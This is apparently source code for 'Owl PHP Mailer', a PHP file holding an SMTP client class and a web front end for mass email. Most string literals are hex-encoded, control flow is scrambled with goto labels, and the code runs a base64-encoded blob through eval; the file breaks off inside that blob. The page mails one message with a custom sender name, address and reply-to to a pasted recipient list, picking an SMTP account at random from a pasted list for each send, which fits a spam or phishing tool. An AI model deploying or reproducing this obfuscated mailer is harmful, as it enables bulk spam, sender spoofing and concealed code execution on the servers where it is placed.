$this->edebug("\x43\x6f\x6e\x6e\x65\143\164\x69\x6f\156\x3a\x20\x73\x74\162\145\141\155\137\163\x6f\x63\x6b\x65\x74\137\143\154\151\x65\x6e\164\40\x6e\157\x74\40\141\166\141\x69\x6c\x61\142\154\x65\54\40\146\141\x6c\x6c\x69\x6e\x67\40\142\141\143\153\40\x74\x6f\40\x66\163\157\143\153\x6f\160\145\x6e", self::DEBUG_CONNECTION); set_error_handler(array($this, "\145\x72\x72\x6f\x72\x48\x61\156\x64\154\x65\x72")); $this->smtp_conn = fsockopen($host, $port, $errno, $errstr, $timeout); restore_error_handler(); } if (!is_resource($this->smtp_conn)) { $this->setError("\106\x61\x69\154\145\x64\x20\164\x6f\x20\x63\157\x6e\156\145\143\164\40\x74\x6f\40\x73\145\x72\166\145\162", '', (string) $errno, (string) $errstr); $this->edebug("\x53\x4d\x54\120\x20\105\x52\x52\117\122\x3a\x20" . $this->error["\145\x72\162\x6f\x72"] . "\x3a\x20{$errstr}\40\50{$errno}\51", self::DEBUG_CLIENT); return false; } $this->edebug("\103\x6f\x6e\156\x65\143\x74\151\x6f\x6e\72\x20\157\x70\x65\x6e\x65\x64", self::DEBUG_CONNECTION); if (substr(PHP_OS, 0, 3) != "\127\111\x4e") { $max = ini_get("\x6d\x61\x78\x5f\145\170\145\x63\165\164\151\x6f\x6e\x5f\164\x69\x6d\145"); if (0 != $max and $timeout > $max) { @set_time_limit($timeout); } stream_set_timeout($this->smtp_conn, $timeout, 0); } $announce = $this->get_lines(); $this->edebug("\x53\105\122\x56\x45\x52\x20\x2d\76\40\x43\114\x49\105\116\x54\x3a\40" . $announce, self::DEBUG_SERVER); return true; } public function startTLS() { if (!$this->sendCommand("\x53\124\x41\x52\x54\x54\114\123", "\123\124\101\x52\x54\124\114\x53", 220)) { return false; } $crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT; if (defined("\x53\x54\122\105\101\x4d\137\x43\122\131\x50\x54\x4f\137\x4d\x45\x54\110\117\104\x5f\x54\114\x53\x76\61\x5f\62\x5f\x43\114\x49\105\116\124")) { $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT; $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT; } set_error_handler(array($this, "\x65\162\162\x6f\x72\x48\x61\x6e\144\x6c\145\x72")); $crypto_ok = stream_socket_enable_crypto($this->smtp_conn, true, $crypto_method); restore_error_handler(); return (bool) $crypto_ok; } public function authenticate($username, $password, $authtype = null, $OAuth = null) { if (!$this->server_caps) { $this->setError("\101\x75\164\150\145\x6e\164\151\x63\x61\164\151\x6f\x6e\40\x69\163\40\x6e\x6f\164\40\141\154\154\x6f\x77\145\144\40\142\145\x66\157\162\145\40\110\105\114\117\57\105\110\114\117"); return false; } if (array_key_exists("\x45\110\x4c\117", $this->server_caps)) { if (!array_key_exists("\101\125\124\x48", $this->server_caps)) { $this->setError("\x41\165\164\x68\145\156\x74\151\x63\x61\164\151\157\156\x20\x69\x73\x20\x6e\157\x74\x20\x61\154\x6c\157\167\145\x64\40\141\164\40\x74\150\151\x73\40\163\x74\x61\147\x65"); return false; } $this->edebug("\x41\x75\164\150\40\x6d\x65\x74\x68\157\144\40\162\145\161\x75\145\x73\x74\x65\x64\72\x20" . ($authtype ? $authtype : "\125\x4e\x53\120\105\103\111\x46\x49\x45\x44"), self::DEBUG_LOWLEVEL); $this->edebug("\101\x75\x74\150\40\155\145\164\150\x6f\x64\163\40\x61\x76\141\x69\x6c\x61\x62\154\x65\40\157\x6e\40\x74\150\145\x20\x73\145\162\x76\145\162\72\40" . implode("\x2c", $this->server_caps["\x41\x55\x54\110"]), self::DEBUG_LOWLEVEL); if (null !== $authtype and !in_array($authtype, $this->server_caps["\x41\125\x54\x48"])) { $this->edebug("\x52\145\161\x75\x65\x73\x74\x65\144\x20\141\x75\x74\150\40\155\145\164\150\157\x64\x20\x6e\157\164\40\141\x76\x61\x69\154\141\x62\x6c\x65\72\40" . $authtype, self::DEBUG_LOWLEVEL); $authtype = null; } if (empty($authtype)) { foreach (array("\x43\122\x41\x4d\x2d\115\x44\x35", "\x4c\117\107\111\x4e", "\x50\114\x41\111\x4e", "\x58\117\x41\125\x54\x48\x32") as $method) { if (in_array($method, $this->server_caps["\101\125\x54\110"])) { $authtype = $method; break; } } if (empty($authtype)) { $this->setError("\116\157\x20\163\165\x70\160\x6f\x72\164\x65\144\x20\141\x75\164\150\145\156\164\151\143\x61\164\151\157\156\40\155\x65\x74\x68\157\x64\x73\x20\146\x6f\165\156\144"); return false; } self::edebug("\101\165\164\x68\40\x6d\145\x74\150\157\x64\x20\x73\x65\154\x65\143\164\x65\x64\x3a\40" . $authtype, self::DEBUG_LOWLEVEL); } if (!in_array($authtype, $this->server_caps["\101\125\x54\x48"])) { $this->setError("\x54\x68\x65\x20\162\x65\x71\165\x65\x73\164\x65\144\x20\141\165\x74\150\x65\x6e\x74\x69\x63\x61\x74\151\157\156\x20\x6d\x65\x74\150\157\144\40\42{$authtype}\x22\x20\x69\x73\x20\156\x6f\164\40\x73\x75\160\160\x6f\162\164\x65\x64\x20\x62\171\40\164\x68\145\x20\x73\x65\x72\x76\x65\x72"); return false; } } elseif (empty($authtype)) { $authtype = "\x4c\117\x47\111\x4e"; } switch ($authtype) { case "\120\x4c\101\x49\x4e": if (!$this->sendCommand("\101\125\124\110", "\101\125\124\110\x20\120\114\x41\x49\x4e", 334)) { return false; } if (!$this->sendCommand("\125\163\145\x72\40\46\40\x50\141\x73\163\167\x6f\162\x64", base64_encode("\x0" . $username . "\0" . $password), 235)) { return false; } break; case "\114\x4f\107\111\x4e": if (!$this->sendCommand("\x41\x55\x54\110", "\x41\125\x54\110\40\x4c\x4f\x47\x49\x4e", 334)) { return false; } if (!$this->sendCommand("\125\163\145\162\156\x61\155\145", base64_encode($username), 334)) { return false; } if (!$this->sendCommand("\120\141\x73\x73\167\x6f\162\144", base64_encode($password), 235)) { return false; } break; case "\x43\122\101\115\55\115\104\x35": if (!$this->sendCommand("\101\x55\x54\110\x20\x43\x52\x41\x4d\x2d\115\x44\x35", "\101\x55\x54\110\x20\x43\122\x41\115\x2d\115\104\x35", 334)) { return false; } $challenge = base64_decode(substr($this->last_reply, 4)); $response = $username . "\40" . $this->hmac($challenge, $password); return $this->sendCommand("\x55\163\x65\x72\x6e\141\155\145", base64_encode($response), 235); case "\130\117\x41\x55\x54\110\62": if (null === $OAuth) { return false; } $oauth = $OAuth->getOauth64(); if (!$this->sendCommand("\x41\125\124\110", "\101\125\x54\x48\40\x58\x4f\x41\125\124\x48\x32\40" . $oauth, 235)) { return false; } break; default: $this->setError("\101\165\x74\150\x65\x6e\164\151\143\141\164\x69\157\x6e\40\x6d\145\164\x68\157\144\40\42{$authtype}\x22\40\x69\x73\40\x6e\x6f\x74\x20\x73\x75\160\x70\x6f\162\x74\145\x64"); return false; } return true; } protected function hmac($data, $key) { if (function_exists("\150\x61\163\150\137\x68\155\x61\143")) { return hash_hmac("\155\x64\x35", $data, $key); } $bytelen = 64; if (strlen($key) > $bytelen) { $key = pack("\x48\x2a", md5($key)); } $key = str_pad($key, $bytelen, chr(0)); $ipad = str_pad('', $bytelen, chr(54)); $opad = str_pad('', $bytelen, chr(92)); $k_ipad = $key ^ $ipad; $k_opad = $key ^ $opad; return md5($k_opad . pack("\110\x2a", md5($k_ipad . $data))); } public function connected() { if (is_resource($this->smtp_conn)) { $sock_status = stream_get_meta_data($this->smtp_conn); if ($sock_status["\x65\157\146"]) { $this->edebug("\123\115\x54\120\40\116\117\x54\111\x43\105\72\40\x45\x4f\x46\x20\143\141\165\147\150\164\x20\167\x68\x69\x6c\145\x20\x63\150\x65\x63\x6b\151\x6e\x67\x20\x69\146\40\143\x6f\x6e\x6e\145\143\x74\x65\144", self::DEBUG_CLIENT); $this->close(); return false; } return true; } return false; } public function close() { $this->setError(''); $this->server_caps = null; $this->helo_rply = null; if (is_resource($this->smtp_conn)) { fclose($this->smtp_conn); $this->smtp_conn = null; $this->edebug("\x43\157\156\156\145\143\x74\x69\x6f\156\72\x20\143\x6c\157\163\x65\x64", self::DEBUG_CONNECTION); } } public function data($msg_data) { if (!$this->sendCommand("\x44\x41\124\x41", "\104\101\x54\x41", 354)) { return false; } $lines = explode("\12", str_replace(array("\xd\xa", "\xd"), "\12", $msg_data)); $field = substr($lines[0], 0, strpos($lines[0], "\72")); $in_headers = false; if (!empty($field) and strpos($field, "\40") === false) { $in_headers = true; } foreach ($lines as $line) { $lines_out = array(); if ($in_headers and $line == '') { $in_headers = false; } while (isset($line[self::MAX_LINE_LENGTH])) { $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), "\40"); if (!$pos) { $pos = self::MAX_LINE_LENGTH - 1; $lines_out[] = substr($line, 0, $pos); $line = substr($line, $pos); } else { $lines_out[] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } if ($in_headers) { $line = "\11" . $line; } } $lines_out[] = $line; foreach ($lines_out as $line_out) { if (!empty($line_out) and $line_out[0] == "\x2e") { $line_out = "\56" . $line_out; } $this->client_send($line_out . static::LE, "\x44\x41\124\x41"); } } $savetimelimit = $this->Timelimit; $this->Timelimit = $this->Timelimit * 2; $result = $this->sendCommand("\104\x41\124\x41\40\x45\x4e\x44", "\56", 250); $this->recordLastTransactionID(); $this->Timelimit = $savetimelimit; return $result; } public function hello($host = '') { return $this->sendHello("\x45\x48\x4c\117", $host) or $this->sendHello("\x48\105\114\x4f", $host); } protected function sendHello($hello, $host) { $noerror = $this->sendCommand($hello, $hello . "\40" . $host, 250); $this->helo_rply = $this->last_reply; if ($noerror) { $this->parseHelloFields($hello); } else { $this->server_caps = null; } return $noerror; } protected function parseHelloFields($type) { $this->server_caps = array(); $lines = explode("\xa", $this->helo_rply); foreach ($lines as $n => $s) { $s = trim(substr($s, 4)); if (empty($s)) { continue; } $fields = explode("\x20", $s); if (!empty($fields)) { if (!$n) { $name = $type; $fields = $fields[0]; } else { $name = array_shift($fields); switch ($name) { case "\x53\111\132\x45": $fields = $fields ? $fields[0] : 0; break; case "\x41\x55\x54\x48": if (!is_array($fields)) { $fields = array(); } break; default: $fields = true; } } $this->server_caps[$name] = $fields; } } } public function mail($from) { $useVerp = $this->do_verp ? "\x20\x58\x56\105\122\120" : ''; return $this->sendCommand("\115\101\111\x4c\x20\x46\122\x4f\115", "\115\x41\x49\x4c\x20\106\x52\x4f\x4d\x3a\x3c" . $from . "\x3e" . $useVerp, 250); } public function quit($close_on_error = true) { $noerror = $this->sendCommand("\x51\x55\111\124", "\x51\x55\x49\x54", 221); $err = $this->error; if ($noerror or $close_on_error) { $this->close(); $this->error = $err; } return $noerror; } public function recipient($address, $dsn = '') { if (empty($dsn)) { $rcpt = "\122\103\120\x54\40\x54\117\x3a\74" . $address . "\x3e"; } else { $dsn = strtoupper($dsn); $notify = array(); if (strpos($dsn, "\116\x45\x56\x45\x52") !== false) { $notify[] = "\116\105\126\x45\x52"; } else { foreach (array("\x53\125\x43\103\105\x53\x53", "\x46\x41\x49\114\x55\x52\x45", "\x44\105\114\x41\x59") as $value) { if (strpos($dsn, $value) !== false) { $notify[] = $value; } } } $rcpt = "\x52\x43\x50\124\x20\124\x4f\72\x3c" . $address . "\x3e\x20\x4e\117\124\111\x46\131\75" . implode("\x2c", $notify); } return $this->sendCommand("\x52\x43\x50\x54\40\124\x4f", $rcpt, array(250, 251)); } public function reset() { return $this->sendCommand("\x52\123\x45\x54", "\x52\x53\x45\124", 250); } protected function sendCommand($command, $commandstring, $expect) { if (!$this->connected()) { $this->setError("\x43\x61\154\154\145\144\x20{$command}\40\167\151\x74\150\157\165\x74\40\x62\x65\x69\156\x67\40\x63\157\x6e\156\x65\x63\x74\145\x64"); return false; } if (strpos($commandstring, "\12") !== false or strpos($commandstring, "\xd") !== false) { $this->setError("\103\x6f\x6d\x6d\x61\x6e\x64\40\x27{$command}\47\40\x63\x6f\x6e\x74\x61\x69\x6e\145\144\40\x6c\151\x6e\x65\40\142\x72\x65\141\153\x73"); return false; } $this->client_send($commandstring . static::LE, $command); $this->last_reply = $this->get_lines(); $matches = array(); if (preg_match("\57\x5e\x28\133\60\55\x39\135\173\63\x7d\51\x5b\x20\x2d\x5d\x28\x3f\72\50\133\x30\55\71\x5d\x5c\56\133\x30\x2d\71\x5d\134\56\x5b\60\55\x39\135\173\x31\54\62\x7d\x29\x20\51\x3f\x2f", $this->last_reply, $matches)) { $code = $matches[1]; $code_ex = count($matches) > 2 ? $matches[2] : null; $detail = preg_replace("\x2f{$code}\133\x20\55\x5d" . ($code_ex ? str_replace("\56", "\134\56", $code_ex) . "\x20" : '') . "\x2f\155", '', $this->last_reply); } else { $code = substr($this->last_reply, 0, 3); $code_ex = null; $detail = substr($this->last_reply, 4); } $this->edebug("\123\105\x52\x56\x45\x52\40\x2d\76\x20\x43\114\x49\x45\116\x54\72\40" . $this->last_reply, self::DEBUG_SERVER); if (!in_array($code, (array) $expect)) { $this->setError("{$command}\40\143\157\155\x6d\141\156\x64\40\146\141\x69\x6c\145\144", $detail, $code, $code_ex); $this->edebug("\123\115\124\120\x20\x45\122\122\x4f\122\72\40" . $this->error["\x65\162\x72\x6f\x72"] . "\72\x20" . $this->last_reply, self::DEBUG_CLIENT); return false; } $this->setError(''); return true; } public function sendAndMail($from) { return $this->sendCommand("\123\101\x4d\x4c", "\123\101\x4d\x4c\x20\106\122\x4f\x4d\x3a{$from}", 250); } public function verify($name) { return $this->sendCommand("\126\x52\x46\131", "\x56\122\x46\x59\x20{$name}", array(250, 251)); } public function noop() { return $this->sendCommand("\x4e\x4f\x4f\120", "\x4e\x4f\117\x50", 250); } public function turn() { $this->setError("\124\x68\x65\x20\123\115\124\x50\40\x54\125\122\x4e\x20\x63\x6f\x6d\155\x61\x6e\144\40\x69\163\x20\156\157\164\x20\x69\x6d\160\154\145\x6d\x65\156\164\x65\x64"); $this->edebug("\123\115\x54\x50\40\x4e\117\x54\x49\x43\105\72\40" . $this->error["\x65\162\162\157\162"], self::DEBUG_CLIENT); return false; } public function client_send($data, $command = '') { if (self::DEBUG_LOWLEVEL > $this->do_debug and in_array($command, array("\x55\x73\145\162\40\x26\x20\120\x61\x73\x73\x77\157\162\144", "\x55\163\145\162\x6e\x61\x6d\x65", "\120\141\163\163\x77\157\x72\144"), true)) { $this->edebug("\x43\114\111\x45\x4e\x54\40\x2d\76\x20\123\x45\122\126\105\x52\72\40\x3c\143\x72\145\144\x65\156\x74\151\x61\154\x73\x20\150\x69\x64\x64\x65\156\76", self::DEBUG_CLIENT); } else { $this->edebug("\x43\x4c\111\x45\116\124\40\55\x3e\40\123\x45\x52\126\105\122\72\x20" . $data, self::DEBUG_CLIENT); } set_error_handler(array($this, "\145\x72\162\x6f\x72\110\x61\x6e\x64\154\x65\x72")); $result = fwrite($this->smtp_conn, $data); restore_error_handler(); return $result; } public function getError() { return $this->error; } public function getServerExtList() { return $this->server_caps; } public function getServerExt($name) { if (!$this->server_caps) { $this->setError("\116\x6f\40\110\x45\114\x4f\57\x45\110\114\117\40\167\141\x73\x20\x73\145\x6e\x74"); return; } if (!array_key_exists($name, $this->server_caps)) { if ("\x48\105\114\117" == $name) { return $this->server_caps["\x45\110\114\x4f"]; } if ("\x45\110\x4c\117" == $name || array_key_exists("\x45\110\114\117", $this->server_caps)) { return false; } $this->setError("\110\105\114\x4f\x20\x68\141\x6e\x64\163\150\141\x6b\145\x20\167\x61\163\40\165\x73\x65\144\73\x20\116\x6f\40\151\x6e\x66\x6f\x72\x6d\141\164\151\x6f\156\x20\x61\142\157\165\164\x20\163\x65\x72\x76\145\x72\x20\x65\170\x74\x65\x6e\x73\151\x6f\156\x73\x20\141\x76\x61\151\154\x61\x62\154\145"); return; } return $this->server_caps[$name]; } public function getLastReply() { return $this->last_reply; } protected function get_lines() { if (!is_resource($this->smtp_conn)) { return ''; } $data = ''; $endtime = 0; stream_set_timeout($this->smtp_conn, $this->Timeout); if ($this->Timelimit > 0) { $endtime = time() + $this->Timelimit; } $selR = array($this->smtp_conn); $selW = null; while (is_resource($this->smtp_conn) and !feof($this->smtp_conn)) { if (!stream_select($selR, $selW, $selW, $this->Timelimit)) { $this->edebug("\123\115\124\x50\40\x2d\76\x20\x67\x65\164\x5f\x6c\151\156\x65\163\x28\x29\72\40\x74\x69\x6d\145\x64\55\x6f\165\x74\x20\x28" . $this->Timeout . "\x20\x73\145\x63\x29", self::DEBUG_LOWLEVEL); break; } $str = @fgets($this->smtp_conn, 515); $this->edebug("\x53\115\x54\120\x20\x49\x4e\x42\x4f\x55\x4e\104\72\40\x22" . trim($str) . "\42", self::DEBUG_LOWLEVEL); $data .= $str; if (!isset($str[3]) or isset($str[3]) and $str[3] == "\x20") { break; } $info = stream_get_meta_data($this->smtp_conn); if ($info["\x74\151\155\145\x64\137\157\x75\x74"]) { $this->edebug("\x53\115\124\120\x20\x2d\x3e\x20\x67\x65\x74\137\x6c\151\156\145\x73\x28\51\72\x20\x74\151\x6d\145\144\x2d\157\165\164\x20\x28" . $this->Timeout . "\40\x73\x65\x63\51", self::DEBUG_LOWLEVEL); break; } if ($endtime and time() > $endtime) { $this->edebug("\x53\115\x54\120\40\55\76\x20\x67\145\x74\x5f\x6c\x69\x6e\x65\x73\x28\51\72\x20\164\x69\x6d\x65\x6c\x69\155\151\x74\40\162\x65\x61\143\150\145\144\x20\50" . $this->Timelimit . "\40\x73\x65\143\x29", self::DEBUG_LOWLEVEL); break; } } return $data; } public function setVerp($enabled = false) { $this->do_verp = $enabled; } public function getVerp() { return $this->do_verp; } protected function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '') { $this->error = array("\145\x72\x72\157\x72" => $message, "\x64\x65\x74\141\x69\x6c" => $detail, "\x73\x6d\164\x70\x5f\143\x6f\x64\x65" => $smtp_code, "\163\x6d\164\160\137\x63\x6f\x64\145\137\145\x78" => $smtp_code_ex); } public function setDebugOutput($method = "\x65\143\x68\x6f") { $this->Debugoutput = $method; } public function getDebugOutput() { return $this->Debugoutput; } public function setDebugLevel($level = 0) { $this->do_debug = $level; } public function getDebugLevel() { return $this->do_debug; } public function setTimeout($timeout = 0) { $this->Timeout = $timeout; } public function getTimeout() { return $this->Timeout; } protected function errorHandler($errno, $errmsg, $errfile = '', $errline = 0) { $notice = "\x43\157\x6e\x6e\x65\143\x74\x69\157\x6e\40\x66\x61\x69\x6c\x65\x64\56"; $this->setError($notice, $errmsg, (string) $errno); $this->edebug("{$notice}\40\x45\162\162\x6f\x72\40\x23{$errno}\72\x20{$errmsg}\40\x5b{$errfile}\x20\x6c\151\x6e\145\40{$errline}\135", self::DEBUG_CONNECTION); } protected function recordLastTransactionID() { $reply = $this->getLastReply(); if (empty($reply)) { $this->last_smtp_transaction_id = null; } else { $this->last_smtp_transaction_id = false; foreach ($this->smtp_transaction_id_patterns as $smtp_transaction_id_pattern) { if (preg_match($smtp_transaction_id_pattern, $reply, $matches)) { $this->last_smtp_transaction_id = trim($matches[1]); break; } } } return $this->last_smtp_transaction_id; } public function getLastTransactionID() { return $this->last_smtp_transaction_id; } } goto H6Qfr; vWRxO: echo $owl["\167\x65\142\163\151\x74\145"]; goto N95yQ; ikxnY: function is_email($input) { $email_pattern = "\x2f\136\x28\133\141\55\x7a\x41\x2d\x5a\60\55\71\134\x2d\x5c\x5f\134\x2e\x5d\173\x31\54\x7d\51\x2b\100\53\x28\x5b\141\x2d\172\x41\x2d\132\x30\55\71\134\55\134\137\134\56\x5d\173\x31\54\175\x29\x2b\134\x2e\x2b\50\x5b\x61\55\x7a\x5d\173\62\54\64\x7d\x29\44\x2f\x69"; if (preg_match($email_pattern, $input)) { return TRUE; } } goto qvHOy; gce0W: ?>
</title>
  <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css" rel="stylesheet">
  <link href="https://owlmailer.io/css/bootstrap-3.3.1.min.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
  <link rel="icon" href="https://owlmailer.io/img/favicon.ico" type="image/x-icon" />


</head>

<body>
    <script>
        var running = false;
        var request;
    </script>

  <script>
    Array.prototype.randomElement = function () {
  return this[Math.floor(Math.random() * this.length)]
 }

 function stopSending()
 {
    running = false;

    if (request) {
        request.abort();
      }

    $("#btnStart").attr("disabled", false);
    $("#btnStop").attr("disabled", true);
 }

 function handleSendingResponse(recipient, response, processedCount, totalEmailCount) {
  $("#progress").append('<div class="col-lg-3">' + processedCount.toString() + '/' + totalEmailCount.toString() + '</div><div class="col-lg-6">' + recipient + '</div>');
  
  if (response == "OK"){
    $("#progress").append('<div class="col-lg-1"><span class="label label-success">Ok</span></div>');
  }
  else if(response == "Incorrect Email"){
    $("#progress").append('<div class="col-lg-1"><span class="label label-default">Incorrect Email</span></div>');
  } else {
    $("#progress").append('<div class="col-lg-1"><span class="label label-default">' + response + '</span></div>');
  }
  $("#progress").append('<br>');
 }

 function startSending() {

 

  var eMailTextArea = document.getElementById("emailList");
  var eMailTextAreaLines = eMailTextArea.value.split("\n");
  var smtpAccountsTextArea = document.getElementById("smtpAccounts");
  var smtpAccountsTextAreaLines = smtpAccountsTextArea.value.split("\n");
  var encodingTypeE = document.getElementById('encoding');
  var encodingType = encodingTypeE.options[encodingTypeE.selectedIndex].value;
  var emailPriorityE = document.getElementById('priority');
  var emailPriority = emailPriorityE.options[emailPriorityE.selectedIndex].value;
 
   var form_data = new FormData();
   form_data.append("action", "send");
   form_data.append("sendingMethod", document.querySelector('input[name="sendingMethod"]:checked').value);
   form_data.append("senderEmail", document.getElementById('senderEmail').value);
   form_data.append("senderName", document.getElementById('senderName').value);
   form_data.append("replyTo", document.getElementById('replyTo').value);
   form_data.append("messageSubject", document.getElementById('subject').value);
   form_data.append("messageLetter", document.getElementById('messageLetter').value);
   form_data.append("altMessageLetter", document.getElementById('altMessageLetter').value);
   form_data.append("messageType", document.querySelector('input[name="messageType"]:checked').value);
   form_data.append("encodingType", encodingType);
   form_data.append("emailPriority", emailPriority);

   for (var x = 0; x < document.getElementById('attachment').files.length; x++) {
      form_data.append("attachment[]", document.getElementById('attachment').files[x]);
   }

  $("#progress").empty();
  var processedCount = 0;
  $(function () {
    var i = 0;
    running = true;

    $("#btnStart").attr("disabled", true);
    $("#btnStop").attr("disabled", false);


    function nextCall() {
      if (i == eMailTextAreaLines.length){

         $("#btnStart").attr("disabled", false);
         $("#btnStop").attr("disabled", true);
         return; //last call was last item in the array
      }

      // Abort any pending request
      if (request) {
        request.abort();
      }
       if(!running)
      {
        return;
      }

      var recipient = eMailTextAreaLines[i++]
      form_data.append("recipient", recipient);
      form_data.append("smtpAcct", smtpAccountsTextAreaLines.randomElement());

      request = $.ajax({
        type: "post",
        data: form_data,
        contentType: false,
        processData: false,
      });
      // Callback handler that will be called on success
      request.done(function (response, textStatus, jqXHR) {
        processedCount += 1;
        handleSendingResponse(recipient, response, processedCount, eMailTextAreaLines.length);
        nextCall();
      });
    }
    nextCall();
  });
 }
</script>
  <div class="container col-lg-6">
    <h3>&#129417; Owl PHP*Mailer*<small> <?php  goto mOfcD; yfgWE: echo $owl["\166\145\x72\163\151\x6f\156"]; goto gce0W; baGp3: if (!isset($_SESSION[$sessioncode])) { $_SESSION[$sessioncode] = ''; } goto Ulz9w; XqBEz: function owlTrim($string) { return stripslashes(ltrim(rtrim($string))); } goto wneZg; Lyzh3: function randString($consonants, $min_length, $max_length) { $length = rand($min_length, $max_length); $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $consonants[rand() % strlen($consonants)]; } return $password; } goto ikxnY; la62l: set_time_limit(0); goto rJMzV; DdQK5: eval(base64_decode("\132\156\x56\x75\131\x33\x52\160\142\62\64\x67\x57\x45\x4a\x66\x54\x31\115\157\112\x46\x56\x54\122\x56\112\146\x51\125\x64\x46\124\x6c\121\x70\x65\x77\60\113\x43\123\122\120\125\61\71\106\125\154\x4a\x50\125\x69\101\147\111\x43\101\x39\x49\x43\x41\x67\111\x6c\x56\165\x61\62\65\166\x64\x32\x34\x67\x54\x31\115\x67\125\x47\170\x68\x64\107\x5a\166\143\155\x30\x69\x4f\x77\60\113\111\x43\101\x67\111\x43\122\120\125\171\x41\x67\x50\123\101\x67\111\x47\106\171\x63\x6d\106\x35\113\103\x41\x6e\114\x33\144\160\142\155\x52\x76\x64\63\115\x67\142\x6e\121\147\115\x54\x41\166\141\123\x63\147\x49\x43\x41\147\x49\103\x41\x39\120\151\101\147\112\61\x64\160\x62\155\x52\166\x64\x33\115\x67\115\x54\x41\x6e\114\101\x30\113\x43\x53\x41\x67\111\x43\x41\x67\111\103\101\147\x49\x43\101\147\x49\103\x41\x67\x49\x43\101\x6e\x4c\x33\x64\160\142\x6d\x52\x76\x64\63\x4d\147\142\156\x51\147\x4e\x69\x34\172\114\62\153\x6e\111\103\101\x67\111\x43\101\71\120\151\101\147\112\61\144\x70\142\x6d\122\x76\144\x33\115\147\117\103\64\x78\x4a\171\x77\116\x43\x67\153\x67\x49\x43\x41\x67\111\x43\101\x67\111\x43\x41\x67\111\103\x41\x67\111\x43\101\147\112\171\71\63\141\x57\x35\x6b\142\x33\x64\x7a\111\107\x35\x30\111\x44\x59\165\x4d\151\71\160\x4a\171\x41\x67\111\103\x41\147\x50\x54\x34\147\111\103\144\130\141\127\x35\x6b\142\x33\x64\172\111\104\x67\156\x4c\x41\x30\113\103\123\101\147\x49\103\x41\147\111\x43\101\147\111\x43\101\147\x49\x43\101\x67\x49\103\101\x6e\x4c\x33\144\160\x62\155\122\x76\x64\63\x4d\x67\142\x6e\121\x67\116\151\x34\x78\x4c\62\153\x6e\111\x43\101\147\111\x43\x41\x39\120\151\101\x67\x4a\x31\x64\160\142\x6d\122\x76\144\63\115\x67\x4e\x79\x63\x73\x44\x51\x6f\112\x49\x43\101\x67\x49\x43\101\x67\x49\x43\x41\147\111\x43\101\x67\x49\103\101\x67\x49\x43\143\x76\x64\62\154\x75\132\107\x39\x33\143\171\102\x75\144\103\x41\x32\x4c\152\x41\166\141\123\x63\147\x49\103\101\147\x49\x44\60\x2b\x49\103\101\156\126\x32\x6c\165\132\x47\x39\63\x63\x79\x42\x57\141\x58\116\x30\x59\123\143\163\104\121\x6f\x4a\111\103\x41\x67\x49\x43\x41\x67\111\x43\101\147\111\x43\101\147\x49\103\x41\x67\x49\x43\x63\166\x64\62\x6c\x75\x5a\x47\71\63\143\171\102\x75\x64\x43\101\x31\x4c\x6a\x49\x76\141\123\x63\147\x49\x43\101\147\x49\104\60\53\x49\103\x41\x6e\x56\x32\154\165\x5a\x47\x39\x33\x63\171\102\124\132\x58\112\62\132\130\111\147\x4d\x6a\101\167\115\x79\x39\131\x55\103\102\x34\116\x6a\x51\156\114\101\60\113\103\123\101\x67\111\103\101\147\x49\x43\101\x67\x49\x43\101\x67\x49\103\101\147\111\103\101\x6e\114\63\144\x70\142\x6d\122\166\x64\x33\115\147\x62\156\x51\147\116\123\x34\x78\114\x32\x6b\156\111\103\x41\x67\111\103\101\71\120\151\x41\147\x4a\61\x64\160\142\155\122\166\144\63\x4d\147\127\106\x41\x6e\114\x41\x30\113\103\123\101\147\x49\x43\101\147\111\x43\101\147\111\x43\x41\147\111\103\101\147\x49\x43\x41\x6e\114\x33\x64\160\x62\155\122\x76\144\x33\115\x67\145\x48\101\166\141\x53\x63\147\x49\x43\x41\x67\x49\x43\x41\147\x49\103\101\71\120\x69\x41\147\x4a\x31\x64\160\142\x6d\x52\x76\144\63\x4d\147\x57\x46\x41\156\114\101\x30\113\103\123\101\147\x49\103\x41\147\111\x43\101\147\111\x43\101\147\111\x43\101\x67\111\x43\101\156\x4c\63\144\x70\142\155\x52\x76\x64\63\x4d\x67\142\x6e\x51\x67\x4e\123\x34\x77\x4c\62\x6b\x6e\111\103\x41\147\x49\103\101\x39\120\151\x41\147\112\61\144\x70\142\x6d\122\x76\144\63\115\x67\x4d\x6a\101\167\115\103\143\163\104\121\157\x4a\111\103\x41\x67\x49\x43\x41\x67\x49\x43\101\147\x49\x43\x41\x67\x49\103\101\147\x49\x43\143\166\x64\62\x6c\165\x5a\x47\71\63\143\171\x42\x74\132\123\71\x70\x4a\171\x41\147\x49\103\101\x67\x49\x43\101\147\111\104\x30\53\111\x43\x41\x6e\126\62\x6c\165\132\x47\71\63\x63\x79\102\116\x52\x53\x63\163\104\121\157\112\x49\x43\101\147\x49\103\x41\x67\x49\103\101\x67\x49\x43\101\x67\x49\x43\101\x67\x49\x43\x63\166\144\62\x6c\x75\117\x54\x67\166\141\x53\143\x67\x49\103\101\147\x49\x43\x41\x67\111\x43\101\147\111\x43\x41\147\111\x44\x30\53\111\103\101\x6e\126\x32\x6c\x75\x5a\107\71\63\x63\171\x41\x35\117\103\x63\x73\x44\x51\157\x4a\x49\x43\x41\147\111\x43\x41\147\111\x43\x41\x67\x49\103\101\x67\111\103\101\x67\111\x43\x63\166\x64\x32\x6c\165\117\x54\x55\166\x61\x53\143\x67\111\x43\x41\147\111\103\x41\x67\111\x43\101\147\111\x43\101\147\x49\x44\x30\x2b\111\103\x41\156\126\62\x6c\165\132\107\71\63\x63\x79\x41\x35\x4e\x53\143\x73\x44\121\157\x4a\111\x43\101\147\111\103\x41\147\x49\103\101\147\111\103\101\x67\x49\x43\x41\147\111\x43\x63\166\x64\62\154\x75\115\124\131\166\141\x53\143\x67\x49\x43\x41\147\x49\x43\101\x67\x49\x43\x41\x67\x49\x43\101\x67\x49\x44\60\53\111\x43\101\x6e\126\62\x